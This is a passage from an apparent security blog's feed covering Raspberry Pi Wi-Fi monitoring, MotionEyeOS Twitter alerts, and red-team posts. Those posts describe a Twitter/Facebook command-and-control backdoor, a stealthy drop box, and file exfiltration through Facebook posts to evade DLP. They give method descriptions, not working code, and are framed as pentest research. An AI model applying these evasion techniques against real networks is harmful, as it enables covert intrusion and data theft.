&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/pi-monitor-puttygen.png&#34; alt=&#34;pi-monitor-puttygen&#34; /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Create a &lt;strong&gt;.ssh&lt;/strong&gt; folder inside the Pi&amp;rsquo;s home folder. Then create a file named &lt;strong&gt;authorized_keys&lt;/strong&gt; inside the &lt;strong&gt;.ssh&lt;/strong&gt; folder. Paste the public key from PuTTYgen into the &lt;strong&gt;authorized_keys&lt;/strong&gt; file. Save the private key from PuTTYgen. Restart SSH service on the Pi. Also change the user &lt;strong&gt;pi&amp;rsquo;&lt;/strong&gt;s default password on the Pi.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/pi-monitor-ssh-setup.png&#34; alt=&#34;pi-monitor-ssh-setup&#34; /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;The Raspbian lite OS by default does not ship with the necessary packages to do the monitoring. So to install them, follow the steps below:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code&gt;sudo apt update&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;sudo apt install aircrack-ng tcpdump -y&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Test that the wireless card is capable of doing monitoring on the Pi.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/pi-monitor-test-monitor.png&#34; alt=&#34;pi-monitor-test-monitor&#34; /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Now that we verified that the monitoring is working on the Pi, we can SSH into the Pi, run tcpdump on Pi and feed it to Wireshark running on the host laptop. &lt;a href=&#34;https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html&#34;&gt;plink.exe&lt;/a&gt; is command line interface to PuTTY.exe that makes all of this possible on Windows. For ease, I have put plink.exe, the SSH private key from PuTTYgen in the same folder. If they are in different folders, change the paths in the below command appropriately.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The one-liner to do all of this is:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;plink.exe -ssh -i pi-monitor-ssh-key.ppk pi@192.168.137.234 &amp;quot;sudo tcpdump -ni wlan1mon -s 0 -w -&amp;quot; | &amp;quot;C:\Program Files\Wireshark\Wireshark.exe&amp;quot; -k -i -&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/pi-monitor-start-command.png&#34; alt=&#34;pi-monitor-start-command&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/pi-monitor-wireshark.png&#34; alt=&#34;pi-monitor-wireshark&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/pi-monitor-handshake-capture.png&#34; alt=&#34;pi-monitor-handshake-capture&#34; /&gt;&lt;/p&gt;

&lt;p&gt;To monitor only channel 1,&lt;/p&gt;

&lt;p&gt;&lt;code&gt;sudo iwconfig wlan1mon channel 1&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;As you can see, a Raspberry Pi can be used to do Wi-Fi monitoring with minimal effort and pipe the output for viewing using Wireshark on Windows or any OS using the same method.&lt;/p&gt;

&lt;h4 id=&#34;the-minimal-setup-to-get-up-and-running&#34;&gt;&lt;strong&gt;The &amp;ldquo;minimal&amp;rdquo; setup to get up and running&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;The above steps are a one time setup. For subsequent monitoring, plug in the Pi with wireless card, power ON the Pi and run the below command to create a monitor mode on the Pi.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;plink.exe -ssh -i pi-monitor-ssh-key.ppk pi@192.168.137.100 &amp;quot;sudo airmon-ng start wlan1&amp;quot;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Fire up Wireshark to start the monitoring.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;plink.exe -ssh -i pi-monitor-ssh-key.ppk pi@192.168.137.100 &amp;quot;sudo tcpdump -ni wlan1mon -s 0 -w -&amp;quot; | &amp;quot;C:\Program Files\Wireshark\Wireshark.exe&amp;quot; -k -i -&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/pi-monitor-setup-1.png&#34; alt=&#34;pi-monitor-setup-1&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/pi-monitor-setup-2.png&#34; alt=&#34;pi-monitor-setup-2&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/pi-monitor-setup-3.png&#34; alt=&#34;pi-monitor-setup-3&#34; /&gt;&lt;/p&gt;

&lt;p&gt;That&amp;rsquo;s it. :)&lt;/p&gt;

&lt;h4 id=&#34;summary&#34;&gt;Summary&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;Pros&lt;/strong&gt;:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;No need to worry about chunky VMs. Wi-Fi monitoring can be performed on Windows with Wireshark and plink.exe. I haven&amp;rsquo;t tried on Linux / Mac OS yet, but should be able to pipe the SSH output to Wireshark (?).&lt;/li&gt;
&lt;li&gt;Cheap Wi-Fi monitoring. If you are already into pentesting or similar, you should be having a RPi, Wireless card lying around. :)&lt;/li&gt;
&lt;li&gt;Wimonitor is limited to the onboard Wi-Fi chipset (?). Raspberry Pi in this setup has the ability to use any (multiple) wireless card with monitor mode support. Only needs to plug the Pi into a power socket or use a batter pack with more juice than a USB hub to power the cards. How about a Yagi–Uda antenna with RPi&amp;rsquo;s wireless card ?&lt;/li&gt;
&lt;li&gt;Minimal setup required. Raspbian, Kali comes with out-of-the-box support for cards like Alfa AWUS036NHA, TL-WN722N etc. Once the above steps are done, it is just a matter of plugging in the Pi with wireless card, and running the two lines of commands to start packet analysis.&lt;/li&gt;
&lt;li&gt;RPi has enough firepower to do the monitoring comfortably. In a relatively busy Wi-Fi neighborhood, the Pi hardly consumes 35 MB of RAM in total with the above setup.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Cons&lt;/strong&gt;:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Not plug n play like Wimonitor. Some initial setup (2 lines at cmd :)) is required to get it up and running.&lt;/li&gt;
&lt;li&gt;No web interface for configuration changes.&lt;/li&gt;
&lt;li&gt;No channel subset hopping capabilities for now.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Hope you find the post useful.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Connecting USB devices to VirtualBox using USB 3.0 ports</title>
      <link>https://zone13.io/post/Connecting_devices_to_VirtualBox_using_USB_3.0_ports/</link>
      <pubDate>Tue, 18 Jul 2017 22:19:34 +0100</pubDate>
      
      <guid>https://zone13.io/post/Connecting_devices_to_VirtualBox_using_USB_3.0_ports/</guid>
      <description>&lt;p&gt;This took me quite a bit of time to figure out, hopefully someone finds the steps useful.&lt;/p&gt;

&lt;p&gt;Many of the wireless cards that support monitor mode are all USB 2.0 devices - e.g. Alfa AWUS036NHA, TP-LINK TL-WN722N and run into problems while connecting to newer laptops that come with only USB 3.0 ports. If you try to connect the wireless card to the USB 3.0 port and then try to attach it to VirtualBox VMs like Kali, it will not work straightaway. To fix this issue, follow the below steps.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Power-off the Kali VM and then connect the wireless card to the USB 3.0 port.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Under the Kali VM Settings on VirtualBox, find the Vendor ID and Product ID by hovering the mouse pointer over the wireless card name as shown below (click the USB icon with &amp;lsquo;+&amp;rsquo; sign to list the connected devices). In this case the Vendor ID is 0CF3 and the Product ID is 9271.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/vbox-1.png&#34; alt=&#34;vbox-1&#34; /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Add a new USB filter using the Vendor ID and Product ID of the device that needs to be connected. Make sure USB 3.0 is selected as the controller.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/vbox-2.png&#34; alt=&#34;vbox-2&#34; /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Unplug the wireless card from the USB 3.0 port and power on the Kali VM. Once the Kali VM is powered on, re-attach the wireless card to the USB 3.0 port and it should automatically connect to the Kali VM.&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Twitter notifications for MotionEyeOS video surveillance system on Raspberry Pi</title>
      <link>https://zone13.io/post/Twitter-notifications-for-MotionEyeOS-video-surveillance-system/</link>
      <pubDate>Mon, 27 Mar 2017 21:18:17 +0100</pubDate>
      
      <guid>https://zone13.io/post/Twitter-notifications-for-MotionEyeOS-video-surveillance-system/</guid>
      <description>

&lt;p&gt;&lt;a href=&#34;https://github.com/ccrisan/motioneyeos&#34;&gt;MotionEyeOS&lt;/a&gt; is a wonderful project by Calin Crisan that converts your single board computer into a video surveillance system in a matter of minutes. It is &lt;a href=&#34;https://github.com/ccrisan/motioneyeos/wiki/Supported-Devices&#34;&gt;supported&lt;/a&gt; on a number of devices and is well maintained with good community support.&lt;/p&gt;

&lt;p&gt;Now that the latest &lt;a href=&#34;https://www.raspberrypi.org/products/pi-zero-w/&#34;&gt;Raspberry Pi Zero version (W)&lt;/a&gt; comes with onboard Wi-Fi, it makes an ideal candidate to deploy MotionEyeOS across your perimeter and run a cheap video surveillance system with lesser clutter of having to attach a Wi-Fi dongle as in the previous versions of Pi Zero.&lt;/p&gt;

&lt;h3 id=&#34;motion-notifications&#34;&gt;Motion notifications&lt;/h3&gt;

&lt;p&gt;MotionEyeOS offers push notifications in the form of email alerts and custom scripts upon detection of motion. The community has already chipped in with options like &lt;a href=&#34;https://www.pi-supply.com/make/adding-push-notifications-motioneyeos-formerly-motionpie/&#34;&gt;Pushover and IFTTT&lt;/a&gt;. I was playing around with the software on Raspberry Pi over the last few days and thought that Twitter notifications on mobile would be nice to have. I did some basic search to see if someone already implemented this, however couldn&amp;rsquo;t find any and decided I will code my own.&lt;/p&gt;

&lt;p&gt;Now the &lt;a href=&#34;https://github.com/ccrisan/motioneyeos/releases&#34;&gt;SD card images&lt;/a&gt; supplied by MotionEyeOS are stripped down versions of the Raspbian OS with only the necessary features for performance reasons. To enable Twitter notifications using my method below, you will have to install MotionEyeOS on top of Raspbian (&lt;a href=&#34;https://www.raspberrypi.org/downloads/raspbian/&#34;&gt;lite version&lt;/a&gt; preferred). This is to ensure that the &lt;a href=&#34;https://github.com/bear/python-twitter&#34;&gt;Python Twitter&lt;/a&gt; module can be installed.&lt;/p&gt;

&lt;h3 id=&#34;installation-steps&#34;&gt;Installation steps&lt;/h3&gt;

&lt;p&gt;I assume that you have the latest version of Raspbian Jessie Lite &lt;a href=&#34;https://www.raspberrypi.org/documentation/installation/installing-images/README.md&#34;&gt;written&lt;/a&gt; to the Micro SD card. I have tested the following method on Pi Zero and Pi 3B and works fine. Use &lt;strong&gt;sudo&lt;/strong&gt; where necessary.&lt;/p&gt;

&lt;p&gt;1&amp;gt; Power ON the Pi and open a SSH session.&lt;/p&gt;

&lt;p&gt;2&amp;gt; Use &lt;strong&gt;raspi-config&lt;/strong&gt; to enable the camera module.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/raspi-config1.png&#34; alt=&#34;raspi-config&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/raspi-config2.png&#34; alt=&#34;raspi-config&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/raspi-config3.png&#34; alt=&#34;raspi-config&#34; /&gt;&lt;/p&gt;

&lt;p&gt;3&amp;gt; Open the &lt;strong&gt;/etc/modules&lt;/strong&gt; file and add &lt;strong&gt;bcm2835-v4l2&lt;/strong&gt; on a new line.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/etc_modules_cam.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;4&amp;gt; Follow the steps mentioned &lt;a href=&#34;https://github.com/ccrisan/motioneye/wiki/Install-On-Raspbian&#34;&gt;here&lt;/a&gt; under &amp;lsquo;Instructions&amp;rsquo; to complete the installation of MotionEyeOS on Raspbian.&lt;/p&gt;

&lt;p&gt;5&amp;gt; Create a dummy Twitter account and setup the API keys. &lt;a href=&#34;https://www.slickremix.com/docs/how-to-get-api-keys-and-tokens-for-twitter/&#34;&gt;Here&lt;/a&gt; is a good resource on generating the Twitter API keys to use in the script.&lt;/p&gt;

&lt;p&gt;6&amp;gt; Install &lt;a href=&#34;https://github.com/bear/python-twitter&#34;&gt;Python Twitter&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;pip install python-twitter&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;7&amp;gt; There are a couple of ways of receiving the push notifications on your Twitter account:&lt;/p&gt;

&lt;p&gt;​   a) Setup the dummy Twitter account to post a Tweet every time motion is detected - &lt;a href=&#34;https://gist.github.com/zone13/947e9eea96294a6e070b630378349e70&#34;&gt;script 1&lt;/a&gt;. Configure your Twitter account to follow the dummy account and receive push notifications on your mobile device using the steps &lt;a href=&#34;https://support.twitter.com/articles/20169887&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;​   b) Script variant that tweets the latest captured image along with the tweet - &lt;a href=&#34;https://gist.github.com/zone13/48a4a918331eda4be50afed6eb5f4f2c&#34;&gt;script 2&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;IMPORTANT&lt;/strong&gt;: If you are planning to use this, make sure that your tweets are &lt;a href=&#34;https://support.twitter.com/articles/20169886&#34;&gt;protected&lt;/a&gt; so that only you or those accounts that you permit can view your tweets. &lt;img src=&#34;https://zone13.io/images/protected_tweets.png&#34; alt=&#34;Protected tweets&#34; /&gt;&lt;/p&gt;

&lt;p&gt;​   c) Setup the dummy Twitter account to send Direct Messages (DM) to your Twitter account - &lt;a href=&#34;https://gist.github.com/zone13/308d5b39f9f968e21041a53cc9644d22&#34;&gt;script 3&lt;/a&gt;. Enable notifications for DMs on your mobile device.&lt;/p&gt;

&lt;p&gt;Using b) above has the added advantage of adding the latest image captured by MotionEyeOS to the Tweet. DMs do not support attaching an image though.&lt;/p&gt;

&lt;p&gt;8&amp;gt; Once you finalize the script to use, create folder at &lt;strong&gt;/var/lib/motioneye&lt;/strong&gt; and store the python script there. Ensure that the script has execute permissions.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/motion_notifications.png&#34; alt=&#34;Motion notifications&#34; /&gt;&lt;/p&gt;

&lt;p&gt;9&amp;gt; Login to the web GUI for MotionEyeOS and configure to run the script under &amp;lsquo;Motion Notifications&amp;rsquo;&lt;/p&gt;

&lt;h3 id=&#34;caveats&#34;&gt;Caveats&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;The Twitter API has limits on the number of tweets and direct messages. However during my tests, none of these limits were hit and I have a fully functional surveillance system at home using this method.&lt;/li&gt;
&lt;li&gt;In one of the scripts (2), I have added a method to upload the latest image capture to the motion alert tweet. This method has its own privacy implications which is the same as uploading your data to any other cloud service. Make sure that you know what you are doing. :)&lt;/li&gt;
&lt;li&gt;Do not expose your live feed to internet using port forwarding. In my case, I OpenVPN into my Raspberry instance to view the live feed.&lt;/li&gt;
&lt;li&gt;Needless to say, use strong passwords for SSH and other service that you enable with MotionEyeOS. Do not re-use the passwords. Also remember that MotionEyeOS stores the password in plaintext in config files.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Hope this post is useful for those who wish to setup Twitter notifications for MotionEyeOS. If you run into problems, please post a comment below and I will try my best to help.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Social network based backdoor for pentests</title>
      <link>https://zone13.io/post/social_network_backdoor_windows/</link>
      <pubDate>Tue, 21 Feb 2017 22:37:30 +0000</pubDate>
      
      <guid>https://zone13.io/post/social_network_backdoor_windows/</guid>
      <description>

&lt;p&gt;Once you gain access to a system during pentest, you might want to retain access by means of a backdoor. The most trivial method is to use &lt;a href=&#34;https://www.offensive-security.com/metasploit-unleashed/meterpreter-backdoor/&#34;&gt;metsvc&lt;/a&gt; which &amp;lsquo;unfortunately&amp;rsquo; is very well fingerprinted by anti-virus software.&lt;/p&gt;

&lt;p&gt;In this post, let us look at how to use a backdoor that uses social network for communications. The method used by the backdoor is identical to what was mentioned in my previous &lt;a href=&#34;https://zone13.io/post/social-media-based-pentest-dropbox/&#34;&gt;post&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/drop_box_design.png&#34; alt=&#34;design&#34; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;I&amp;rsquo;m going to assume that the pentester already has a meterpreter shell on the system that he wants to backdoor.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h5 id=&#34;steps&#34;&gt;Steps&lt;/h5&gt;

&lt;ul&gt;
&lt;li&gt;The Python code for the backdoor is compiled into &lt;strong&gt;exe&lt;/strong&gt; using &lt;a href=&#34;http://www.pyinstaller.org/&#34;&gt;PyInstaller&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;The backdoor is uploaded to the system using the existing meterpreter shell and executed&lt;/li&gt;
&lt;li&gt;The backdoor code polls the pentester&amp;rsquo;s Twitter handle every 30 seconds for commands&lt;/li&gt;
&lt;li&gt;The command retrieved is executed on the system and the output is uploaded to the pentester&amp;rsquo;s Facebook page.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Even if the target network containing the system we are backdooring keeps a check on all traffic (HTTPS), the proxy will only notice the C&amp;amp;C traffic from the system as legitimate API calls to Facebook and Twitter - hence providing the necessary levels of stealth.&lt;/p&gt;

&lt;h5 id=&#34;video-demo-youtube-link&#34;&gt;Video demo (YouTube link)&lt;/h5&gt;

&lt;p&gt;&lt;a href=&#34;https://youtu.be/RG5uQGGPDq4&#34;&gt;&lt;img src=&#34;http://img.youtube.com/vi/RG5uQGGPDq4/0.jpg&#34; alt=&#34;Demo video&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Stealthy social network (Twitter / Facebook) based pentest drop box</title>
      <link>https://zone13.io/post/social-media-based-pentest-dropbox/</link>
      <pubDate>Sat, 04 Feb 2017 23:58:30 +0000</pubDate>
      
      <guid>https://zone13.io/post/social-media-based-pentest-dropbox/</guid>
      <description>

&lt;blockquote&gt;
&lt;p&gt;The best place to exchange a secret is amongst a crowd - unknown.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;With the amount of traffic generated by social networks, what if you could camouflage the pentest drop box traffic?&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Pentest drop box&lt;/strong&gt; - a portable device that is plugged (or connected wirelessly) to the target network during pentests and can be controlled from a command and control (C&amp;amp;C) server to perform the following functions:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Network monitoring / sniffing&lt;/li&gt;
&lt;li&gt;Scan /exploit other hosts in the network&lt;/li&gt;
&lt;li&gt;ARP / DNS poisoning for MiTM attacks&lt;/li&gt;
&lt;li&gt;Denial of service&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Drop boxes can call C&amp;amp;C using a number of methods, not limited to:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Reverse SSH (over OpenVPN)&lt;/li&gt;
&lt;li&gt;SSH over HTTP(s)&lt;/li&gt;
&lt;li&gt;DNS tunneling - &lt;a href=&#34;https://www.stevencampbell.info/2017/02/configure-pentest-dropbox-dns-tunneling/&#34;&gt;here&lt;/a&gt; is a good write-up&lt;/li&gt;
&lt;li&gt;Route through TOR&lt;/li&gt;
&lt;li&gt;ICMP based shell&lt;/li&gt;
&lt;li&gt;Egress buster - try all outbound ports until you find an open port&lt;/li&gt;
&lt;li&gt;Use a 3G dongle so that the C&amp;amp;C commands don&amp;rsquo;t touch the target network&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Most of the above methods will require a persistent connection (shell) with your C&amp;amp;C, increasing the chances of detection. Often your connection may get interrupted, so you may also need a re-connect mechanism.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;So, how can you create an near perfect C&amp;amp;C mechanism?&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;It should blend with the rest of the network traffic and be asynchronous. Of course, encryption is a must.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Say hello to social media based drop boxes.. !!&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;I wrote a &lt;a href=&#34;https://zone13.io/post/abusing-social-network-APIs-for-Fun-and-Profit1/&#34;&gt;blog post&lt;/a&gt; earlier on using Facebook API for data exfiltration during Red team pentests. A similar method was used to create a C&amp;amp;C for the drop box here.&lt;/p&gt;

&lt;p&gt;The advantage here is that it can be quite hard to distinguish the drop box C&amp;amp;C traffic from the legitimate social network traffic. The social network API calls offer HTTPS encryption, which is a huge advantage.&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&#34;design&#34;&gt;Design&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Upstream&lt;/strong&gt; - for receiving commands from C&amp;amp;C&lt;/p&gt;

&lt;p&gt;Twitter - has a tweet limit of 140 characters, perfect for issuing commands to the drop box. The API calls uses HTTPS by default.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Downstream&lt;/strong&gt; - for receiving the results of commands, data exfiltration&lt;/p&gt;

&lt;p&gt;Facebook - has a post limit of 63,206 characters - which in most cases can be sufficient to receive command outputs like nmap scan results.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Stealth&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;To prevents mining of C&amp;amp;C tweets and posts made to Facebook, it is advisable to limit the privacy options.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/twitter_privacy.png&#34; alt=&#34;Twitter privacy&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/unpublish_page.png&#34; alt=&#34;Facebook privacy&#34; /&gt;&lt;/p&gt;

&lt;h5 id=&#34;hardware&#34;&gt;Hardware&lt;/h5&gt;

&lt;p&gt;The pentester&amp;rsquo;s life has become a lot easier during physical pentests, thanks to the single board computers and the support they get. This gives a lot of freedom in terms of customizing the drop box in terms of software that needs to be on the box. Essentially, you can now build a drop box from scratch with only the tools you need. The low price tags are also an added advantage.&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;m a big fan of Raspberry Pi (RPi), so my drop box builds have been based on them till now. &lt;a href=&#34;http://www.blackhillsinfosec.com/&#34;&gt;Black Hills Information Security&lt;/a&gt; had published a &lt;a href=&#34;http://www.blackhillsinfosec.com/?p=5156&#34;&gt;blog post&lt;/a&gt; on building your own drop box along with the a detailed comparison of single board computers. They have been doing some really cool research stuff and this is no exception. If you are planning to build a box on your own, I would highly recommend reading their blog post to start with.&lt;/p&gt;

&lt;h5 id=&#34;software&#34;&gt;Software&lt;/h5&gt;

&lt;p&gt;There is a Kali build for RPi available and it is possible to use their metapackages to customize for your engagement - web, Wi-Fi etc. If you want to keep it really light weight, you can also start with the Raspbian Lite and then customize for your needs.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/drop_box_design.png&#34; alt=&#34;design&#34; /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h4 id=&#34;demos&#34;&gt;Demos&lt;/h4&gt;

&lt;p&gt;For the sake of the demo, I will be running the scripts manually. During deployments, I simply start the script at boot and let it query for commands every minute or so.&lt;/p&gt;

&lt;p&gt;During the demo, I will be showing how the commands are passed as tweets which are retrieved and executed by the drop box. The results of the command are then posted to Facebook page.&lt;/p&gt;

&lt;p&gt;Demo video (YouTube link):&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=0VwMmq4XusE&#34;&gt;&lt;img src=&#34;http://img.youtube.com/vi/0VwMmq4XusE/0.jpg&#34; alt=&#34;Demo video&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;Mitigations&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;It will be hard to come up with a solution to completely mitigate this from a Blue team perspective. DNS and deep packet inspection would be the way to go.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Follow-up&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Any suggestions / thoughts and mitigations are welcome.&lt;/p&gt;

&lt;p&gt;Hope you find some use for this during pentests.&lt;/p&gt;

&lt;p&gt;Cheers !!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Abusing social network APIs for Fun &amp; Profit - Facebook API</title>
      <link>https://zone13.io/post/abusing-social-network-APIs-for-Fun-and-Profit1/</link>
      <pubDate>Tue, 31 Jan 2017 23:58:30 +0000</pubDate>
      
      <guid>https://zone13.io/post/abusing-social-network-APIs-for-Fun-and-Profit1/</guid>
      <description>&lt;p&gt;&lt;strong&gt;&lt;em&gt;Question - In a controlled corporate environment with DLP solutions monitoring the HTTP and Email traffic, how would you perform data exfiltration during a Red Team Pentest ?&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;&amp;lsquo;One&amp;rsquo; of the answers would be to use social networking sites, let&amp;rsquo;s look at Facebook in this post.&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/fb_post.png&#34; alt=&#34;fb_post&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Data exfiltration using Facebook (FB) and the like is nothing new. There has been various instances where these networks have been used as C&amp;amp;C, data receivers etc..&lt;/p&gt;

&lt;p&gt;Why are social networking sites a good option - one major reason is that they are loosely controlled (not blocked in many organizations - is LinkedIn blocked at your workplace?)&lt;/p&gt;

&lt;p&gt;FB allows &lt;a href=&#34;http://mashable.com/2012/01/04/facebook-character-limit/#s7MHOr9Q6Gqo&#34;&gt;63,206 characters&lt;/a&gt; in a single post, which is quite cool. So can we use that as a receiver, i.e, post data to a FB post from a corporate environment and then retrieve it from outside??&lt;/p&gt;

&lt;p&gt;Ok, as some of you are already thinking - that would mean giving up the data to Facebook. Solution - Use Encryption  - encrypt the data using AES or similar and then post to FB. (Maybe?)&lt;/p&gt;

&lt;p&gt;Well, 63,206 is not a big number. What if I want to send out a bigger file? - Split the file into chunks, say 50,000 characters into each post. Finally combine all of them.&lt;/p&gt;

&lt;p&gt;Surely you don&amp;rsquo;t want to login to your personal Facebook to paste data to your wall (!). Let&amp;rsquo;s use Facebook APIs.&lt;/p&gt;

&lt;p&gt;Now, I would assume that it is not always ASCII data that we would want to send out. E.g. Zip archives, image files or anything for that reason. So what do you do?&lt;/p&gt;

&lt;p&gt;The approach I took is as below:&lt;/p&gt;

&lt;p&gt;Read the file in binary mode &amp;ndash;&amp;gt; Do a base-64 encoding of the binary data which gives the ascii version &amp;ndash;&amp;gt; split them up as necessary and post to FB using API from inside the corporate network &amp;ndash;&amp;gt; Retrieve the data from the (multiple) FB posts from outside and combine them &amp;ndash;&amp;gt; do the base-64 decoding &amp;ndash;&amp;gt; write the output in binary mode to file &amp;ndash;&amp;gt; BINGO !!&lt;/p&gt;

&lt;p&gt;Now, one thing you can also do is to Unpublish the Page / control the viewing to which you are making the post. That way, it will ensure that only the Page owner can view the posted data.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/unpublish_page.png&#34; alt=&#34;unpublished_page&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;u&gt;Red Team scenario&lt;/u&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;I would like to present the usage through a Red team exercise scenario where the task is to perform exfiltration of a sample file (of the order a few KBs magnitude). There is nothing to prevent the same method from being used to send out a large file; for the sake of the PoC, I will keep it simple. :)&lt;/p&gt;

&lt;p&gt;&lt;u&gt;Explanation&lt;/u&gt;&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;During a Red team exercise, you get access to a machine from where the data (file) needs to be pulled. Imagine that the DLP solutions would detect you from sending out data via webmail, file upload solutions and the only open ports for outside access are 80 and 443. Definitely you don&amp;rsquo;t want to risk detection on port 80.&lt;/li&gt;
&lt;li&gt;That leaves us with port 443. Say for instance there is a whitelist policy in place that only allows access to specific websites and incidentally Facebook is one of them (!). [As a side note, the same method can be allowed to send out data by abusing APIs provided by other social media sites as well. Time to block LinkedIn API from corporate network? :) ]&lt;/li&gt;
&lt;li&gt;The method can be used as follows:

&lt;ol&gt;
&lt;li&gt;Suppose the data to be sent out is in the form of a zip file (&lt;strong&gt;secret.zip&lt;/strong&gt;) on the target system that we have access to.&lt;/li&gt;
&lt;li&gt;Read the zip file (I&amp;rsquo;m using Python for the PoC) in binary mode.&lt;/li&gt;
&lt;li&gt;Do a base-64 encode of the binary data&lt;/li&gt;
&lt;li&gt;Post the base-64 encode of the data to FB&lt;/li&gt;
&lt;li&gt;Retrieve the encoded data from outside the corporate network, again FB API can be used.&lt;/li&gt;
&lt;li&gt;Decode the base-64 encoded data to binary and write to file (zip)&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;/ol&gt;

